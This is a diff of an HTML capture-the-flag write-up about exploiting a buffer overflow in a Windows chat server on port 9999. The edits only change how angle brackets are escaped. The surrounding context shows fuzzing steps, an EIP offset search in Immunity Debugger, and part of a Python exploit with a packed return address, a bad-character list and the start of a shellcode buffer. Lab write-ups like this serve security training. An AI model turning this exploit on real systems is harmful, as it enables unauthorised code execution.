@@ -405,7 +405,7 @@
 </p>
 <p>FTP with anonymous login, RDP and a service running on port 9999. This seems to be a windows machine.</p>
 <p>We can start off by anonymously accessing the FTP server
-<code>ftp &lt;;IP&gt;;</code></p>
+<code>ftp <;IP>;</code></p>
 <p>Enter username and password as <code>anonymous</code></p>
 <p>
 
@@ -502,7 +502,7 @@
 </p>
 <h4 id="fuzzing-with-python" class="relative group">Fuzzing with python <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#fuzzing-with-python" aria-label="Anchor">#</a></span></h4>
 <p>To inspect the crash, we need to work with chatserver.exe in our windows lab environment. We attach the executable to Immunity debugger as follows</p>
-<p><code>File &gt;; Open &gt;; path_to_chatserver.exe</code></p>
+<p><code>File >; Open >; path_to_chatserver.exe</code></p>
 <p>Run it by pressing the play button or F5 key.</p>
 <p>
 
@@ -519,7 +519,7 @@
 
 </p>
 <p>Let us test if we can reach the chatserver from our local machine</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc -nv &lt;<span class="p">;</span>windows IP&gt;<span class="p">;</span> <span class="m">9999</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nc -nv <<span class="p">;</span>windows IP><span class="p">;</span> <span class="m">9999</span>
 </code></pre></div><p>
 
 
@@ -566,7 +566,7 @@
 </p>
 <h4 id="finding-the-offset" class="relative group">Finding the offset <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#finding-the-offset" aria-label="Anchor">#</a></span></h4>
 <p>We sent a bunch of As to the server, it crashed. So now we need to figure out the size of the buffer before the EIP (the offset).</p>
-<p>On immunity debugger, right click the ESP &gt;; follow dump. Check the hex value for where the A starts and ends</p>
+<p>On immunity debugger, right click the ESP >; follow dump. Check the hex value for where the A starts and ends</p>
 <p>
 
 
@@ -782,8 +782,8 @@
 <span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
 <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">IP</span><span class="p">,</span><span class="n">PORT</span><span class="p">))</span>
 <span class="n">username</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;SAUDI&#34;</span>
-<span class="n">new_eip</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;I&#34;</span><span class="p">,</span><span class="mh">0x62501503</span><span class="p">)</span>
-<span class="n">badchars</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;&lt;B&#34;</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">)])</span>
+<span class="n">new_eip</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;<I&#34;</span><span class="p">,</span><span class="mh">0x62501503</span><span class="p">)</span>
+<span class="n">badchars</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&#34;<B&#34;</span><span class="p">,</span><span class="n">x</span><span class="p">)</span><span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">)])</span>
 <span class="n">buf</span> <span class="o">=</span>  <span class="sa">b</span><span class="s2">&#34;&#34;</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xbd\xaf\x88\xc7\xb6\xdb\xd5\xd9\x74\x24\xf4\x5e\x2b</span><span class="s2">&#34;</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\xc9\xb1\x52\x31\x6e\x12\x83\xc6\x04\x03\xc1\x86\x25</span><span class="s2">&#34;</span>
